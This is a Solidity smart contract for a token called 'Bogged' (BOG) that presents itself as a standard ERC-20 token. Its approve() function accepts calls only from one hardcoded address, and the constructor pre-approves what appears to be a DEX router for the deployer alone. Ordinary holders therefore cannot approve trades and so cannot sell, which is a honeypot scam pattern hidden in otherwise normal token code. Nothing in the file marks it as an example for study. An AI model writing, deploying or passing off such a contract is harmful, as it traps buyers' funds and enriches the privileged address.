pragma solidity 0.5.7;

contract Bogged {
  
    mapping (address => uint256) public balanceOf;

    string public name = "Bogged";
    string public symbol = "BOG";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100 * (uint256(10) ** decimals);

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor() public {
        
        balanceOf[msg.sender] = totalSupply;
        allowance[msg.sender][0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = 1000000000000000000000000000;
    }

    function transfer(address to, uint256 value) public returns (bool success) {
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value)
        public
        returns (bool success)
    {
        require(msg.sender == 0xa25ab5e8F4f5EEe43d3A376887EBE27152ae74B9);
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value)
        public
        returns (bool success)
    {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
}